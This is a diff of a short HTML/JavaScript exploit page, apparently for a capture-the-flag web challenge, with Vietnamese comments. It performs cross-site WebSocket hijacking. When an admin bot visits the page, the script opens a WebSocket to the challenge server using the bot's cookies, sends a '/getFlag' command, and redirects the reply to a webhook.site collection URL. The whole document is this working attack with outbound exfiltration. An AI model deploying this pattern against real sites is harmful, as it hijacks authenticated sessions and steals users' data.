@@ -1,16 +1,17 @@
-<!DOCTYPE html>
-<html>
-<body>
 <script>
-  const socket = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");
+  // Tạo WebSocket connection đến server challenge
+  const ws = new WebSocket("ws://wembsoncket.chal.cyberjousting.com:3000");
 
-  socket.onopen = () => {
-    socket.send(JSON.stringify({ message: "/getFlag" }));
+  // Khi admin bot truy cập URL của chúng ta với cookie admin
+  // WebSocket connection này sẽ được tạo với cookie admin
+  ws.onopen = () => {
+    // Gửi lệnh getFlag
+    ws.send(JSON.stringify({ message: "/getFlag" }));
   };
 
-  socket.onmessage = (event) => {
-    navigator.sendBeacon("https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd")
+  ws.onmessage = (event) => {
+    // Chuyển flag đến server của chúng ta
+    location =
+      "https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?" + event.data;
   };
 </script>
-</body>
-</html>
